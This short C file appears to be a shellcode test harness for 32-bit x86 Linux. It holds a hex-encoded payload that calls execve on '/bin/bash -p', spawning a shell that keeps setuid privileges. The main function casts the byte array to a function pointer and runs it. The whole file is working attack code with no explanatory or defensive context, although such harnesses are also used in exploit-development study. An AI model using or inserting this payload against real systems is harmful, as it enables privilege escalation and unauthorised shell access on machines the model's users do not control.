#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";



int main(int argc, char **argv) {
	printf("\nShellcode length: %d\n", strlen(shellcode));
	(*(void(*)()) shellcode)(); 
}